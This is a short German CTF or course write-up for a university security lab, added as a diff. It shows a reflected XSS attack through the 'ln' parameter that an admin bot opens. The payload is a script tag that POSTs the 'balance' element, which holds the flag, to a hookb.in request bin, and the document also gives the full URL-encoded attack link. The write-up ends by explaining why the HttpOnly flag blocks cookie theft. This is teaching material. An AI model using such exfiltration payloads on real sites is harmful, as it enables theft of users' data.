@@ -1,0 +1,22 @@
+Wir wissen, dass der admin jeden Link öffnet.
+Wir wissen, dass wir den `ln` query parameter für XSS attacken verwenden können (static analysis).
+Wir wissen, dass die flag in dem element mit der id "balance" steht.
+
+Therefore, können wir uns folgendes script basteln (wir verwenden hookb.in mit entsprechendem key als target server):
+
+<script>
+    fetch("https://hookb.in/XXXXXXXXXXXXXXXX", {
+        method: "POST",
+        body: '' + document.getElementById("balance").innerHTML
+    })
+</script>
+
+Das script gefolded und escaped ergibt dann den folgenden Link:
+
+http://itsec.sec.in.tum.de:7013/?ln=%3Cscript%3Efetch%28%22https%3A%2F%2Fhookb.in%2FYVnOQj8ygKsQERGGEgGn%22%2C%7Bmethod%3A%22POST%22%2Cbody%3A%27%27%2Bdocument.getElementById%28%22balance%22%29.innerHTML%7D%29%3C%2Fscript%3E
+
+
+Das stehlen des Session Cookies ist nicht möglich, da für den session die HttpOnly flag gesetzt ist: https://developer.mozilla.org/en-US/docs/Web/HTTP/Cookies#restrict_access_to_cookies
+(siehe dev tools, die diese flag anzeigen).
+Das bewirkt, dass auf solch ein Cookie nicht von scripts zugegriffen werden kann.
+Somit ist das extrahieren des Session Cookie nur möglich über solch eine Attacke, wenn diese flag nicht gesetzt ist.
